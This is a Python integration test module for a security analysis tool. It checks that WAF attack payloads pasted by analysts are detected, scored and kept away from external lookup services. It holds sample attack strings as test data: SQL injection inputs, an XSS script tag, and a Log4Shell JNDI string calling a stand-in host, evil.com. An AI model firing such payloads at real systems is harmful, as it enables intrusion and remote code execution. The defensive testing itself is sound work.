"""Integration tests for WAF payload type detection and pipeline routing.

Per ``docs/waf_payload_analyzer.md`` D6, this module's highest-risk integration
point is that WAF payloads arrive through the *same* textarea as every other
IOC, so they are inside ``parsed_input_items`` by construction — unlike the
process and command-line modules, whose findings never enter that list at all.

Two claims D6 makes are asserted here against the real code rather than taken on
trust:

1. a WAF payload never reaches :func:`ioc.verdict.summarize_results`, which
   emits one row and one session-summary count per item it is given;
2. a WAF payload resolves to an empty provider set, so no lookup can fire for
   it — an attacker-supplied payload must never be forwarded to an external
   service.

The second is currently true *by omission* (no entry in the type-to-group map).
Testing it makes it true by intent, so that adding a mapping later fails loudly
here instead of quietly enabling outbound calls.
"""
from __future__ import annotations

import unittest

import dataclasses

from core.waf_payload_analyzer import analyze_waf_payload, to_rows
from ioc.parser import parse_iocs
from ioc.verdict import summarize_results

SQLI_LINE = "/login?user= | ' OR '1'='1"
LOG4SHELL_LINE = "/api/data | ${jndi:ldap://evil.com/a}"


class TestTypeDetection(unittest.TestCase):
    def test_waf_payload_is_detected_and_split(self) -> None:
        items = parse_iocs(SQLI_LINE)
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0].type, "waf_payload")
        self.assertIsNotNone(items[0].waf)
        self.assertEqual(items[0].waf.path, "/login?user=")
        self.assertEqual(items[0].waf.payload, "' OR '1'='1")

    def test_value_stays_the_raw_line(self) -> None:
        # ``value`` is the dedup key, the row label and what the analyst typed.
        items = parse_iocs(LOG4SHELL_LINE)
        self.assertEqual(items[0].value, LOG4SHELL_LINE)

    def test_existing_types_are_unaffected(self) -> None:
        raw = "\n".join([
            "8.8.8.8",
            "example.com",
            "http://evil.test/a",
            "44d88612fea8a8f36de82e1278abb02f",
            "user@example.com",
            "acmecorp",
        ])
        types = [i.type for i in parse_iocs(raw)]
        self.assertEqual(types, ["ip", "domain", "url", "hash", "email", "whois"])

    def test_waf_detection_never_steals_another_type(self) -> None:
        # Every detector above the WAF check is anchored ^…$, so none can match
        # a line with the delimiter — but a URL carrying a quote or an angle
        # bracket is the case where a careless reordering would do damage.
        for line in (
            "http://example.com/search?q=<script>alert(1)</script>",
            "example.com/login?id=1'",
            "8.8.8.8",
        ):
            with self.subTest(line=line):
                items = parse_iocs(line)
                self.assertEqual(len(items), 1)
                self.assertNotEqual(items[0].type, "waf_payload")

    def test_mixed_batch_keeps_order_and_types(self) -> None:
        raw = "\n".join(["8.8.8.8", SQLI_LINE, "example.com"])
        items = parse_iocs(raw)
        self.assertEqual(
            [(i.type) for i in items],
            ["ip", "waf_payload", "domain"],
        )

    def test_non_waf_iocs_carry_no_split(self) -> None:
        for item in parse_iocs("8.8.8.8\nexample.com"):
            with self.subTest(value=item.value):
                self.assertIsNone(item.waf)

    def test_missing_payload_survives_line_stripping(self) -> None:
        # parse_iocs strips each line, so a trailing-space delimiter is gone by
        # the time the type cascade runs. Asserted here rather than only at unit
        # level, because the unit test passes on input the app cannot produce.
        items = parse_iocs("/login?user= | \n")
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0].type, "waf_payload")
        self.assertEqual(items[0].waf.payload, "")


class TestManualModeExemption(unittest.TestCase):
    def test_waf_payload_survives_a_restrictive_manual_filter(self) -> None:
        # Manual mode's checkboxes gate provider calls per IOC group. A WAF
        # payload makes no provider calls and has no checkbox, so filtering it
        # out would drop the line with no way for the analyst to opt back in.
        items = parse_iocs(
            "\n".join([SQLI_LINE, "8.8.8.8"]),
            auto_detect=False,
            allowed_types={"hash"},
        )
        self.assertEqual([i.type for i in items], ["waf_payload"])

    def test_manual_filter_still_applies_to_every_other_type(self) -> None:
        items = parse_iocs(
            "8.8.8.8\nexample.com",
            auto_detect=False,
            allowed_types={"ip"},
        )
        self.assertEqual([i.type for i in items], ["ip"])


class TestPipelineRouting(unittest.TestCase):
    """D6 — the partition, asserted rather than assumed."""

    @staticmethod
    def _partition(raw: str) -> tuple[list, list]:
        """Mirror of the partition in app.py's enrichment block."""
        parsed = parse_iocs(raw)
        waf = [i for i in parsed if i.type == "waf_payload"]
        rest = [i for i in parsed if i.type != "waf_payload"]
        return waf, rest

    def test_summarize_results_never_sees_a_payload(self) -> None:
        waf_items, items = self._partition("\n".join([SQLI_LINE, "8.8.8.8"]))
        self.assertEqual(len(waf_items), 1)

        summary, rows = summarize_results(items, {}, {}, {}, {}, {})

        # One row and one count for the IP, nothing for the payload. Passing the
        # unpartitioned list here would produce an evidence-free "Unknown" row
        # and inflate the session totals the score panel renders.
        self.assertEqual(summary["total"], 1)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["Artifact"], "8.8.8.8")

    def test_a_payload_only_batch_produces_no_ioc_rows(self) -> None:
        waf_items, items = self._partition("\n".join([SQLI_LINE, LOG4SHELL_LINE]))
        self.assertEqual(len(waf_items), 2)
        self.assertEqual(items, [])

        summary, rows = summarize_results(items, {}, {}, {}, {}, {})
        self.assertEqual(summary["total"], 0)
        self.assertEqual(rows, [])


class TestEndToEnd(unittest.TestCase):
    """The full app.py path: parse, partition, analyse, render."""

    RAW = "\n".join([
        "8.8.8.8",
        "/login?user= | id=1%27 OR 1=1",
        "/api/data | ${jndi:ldap://evil.com/a}",
        "example.com",
        "server1 | server2",
    ])

    def _run(self) -> tuple[dict, list, list]:
        """Mirror app.py's enrichment block, minus the provider calls."""
        parsed = parse_iocs(self.RAW)
        waf_items = [i for i in parsed if i.type == "waf_payload"]
        items = [i for i in parsed if i.type != "waf_payload"]
        waf_results = [analyze_waf_payload(i.waf) for i in waf_items if i.waf]
        summary, rows = summarize_results(items, {}, {}, {}, {}, {})
        waf_rows = [row for r in waf_results for row in to_rows(r)]
        return summary, rows, waf_rows

    def test_batch_splits_into_the_right_two_streams(self) -> None:
        summary, rows, waf_rows = self._run()
        # The IP and the domain go through the IOC pipeline; the two payloads
        # go through this module; the stray-pipe line is dropped by the gate.
        self.assertEqual(summary["total"], 2)
        self.assertEqual([r["Artifact"] for r in rows], ["8.8.8.8", "example.com"])
        self.assertEqual(len(waf_rows), 2)

    def test_concatenated_table_has_no_ragged_columns(self) -> None:
        # What the renderer actually does. A key present in one stream and
        # absent in the other breaks the Table render for the whole run.
        _, rows, waf_rows = self._run()
        keys = {frozenset(r.keys()) for r in rows + waf_rows}
        self.assertEqual(len(keys), 1, "row schemas diverged between streams")

    def test_result_survives_asdict_for_the_json_output(self) -> None:
        parsed = parse_iocs("/login?user= | id=1%27 OR 1=1")
        result = analyze_waf_payload(parsed[0].waf)
        blob = dataclasses.asdict(result)
        self.assertEqual(blob["path"], "/login?user=")
        self.assertIn("1' OR 1=1", blob["decoded_payload"])
        self.assertIn("crs_anomaly_score_pl12", blob)
        self.assertIn("cve_fingerprint_match", blob)

    def test_payload_only_batch_still_produces_rows(self) -> None:
        parsed = parse_iocs("/api/data | ${jndi:ldap://evil.com/a}")
        waf_items = [i for i in parsed if i.type == "waf_payload"]
        results = [analyze_waf_payload(i.waf) for i in waf_items if i.waf]
        rows = [row for r in results for row in to_rows(r)]
        self.assertEqual(len(rows), 1)
        # Log4Shell trips its curated CVE fingerprint, the module's only
        # single-source Malicious (D10).
        self.assertEqual(rows[0]["Verdict"], "Malicious")


class TestProviderIsolation(unittest.TestCase):
    """The claim that a payload can never be sent to an external service."""

    def test_type_is_absent_from_the_provider_group_map(self) -> None:
        # app.py cannot be imported under test (it executes Streamlit calls at
        # module scope), so the map is read from source. Crude, but it pins the
        # invariant that actually matters, and fails loudly if someone adds a
        # group for this type without revisiting D6.
        from pathlib import Path

        source = Path(__file__).resolve().parents[1] / "app.py"
        text = source.read_text(encoding="utf-8")
        start = text.index("_IOC_TYPE_TO_GROUP")
        block = text[start:text.index("}", start)]
        self.assertNotIn("waf_payload", block)

    def test_partition_happens_before_provider_dispatch(self) -> None:
        # Ordering is the whole defence: the partition must appear ahead of the
        # provider_flags computation in the enrichment block.
        from pathlib import Path

        text = (Path(__file__).resolve().parents[1] / "app.py").read_text(encoding="utf-8")
        partition_at = text.index('i.type == "waf_payload"')
        dispatch_at = text.index("provider_flags = {p: bool(_payload(p))")
        self.assertLess(partition_at, dispatch_at)


if __name__ == "__main__":
    unittest.main()
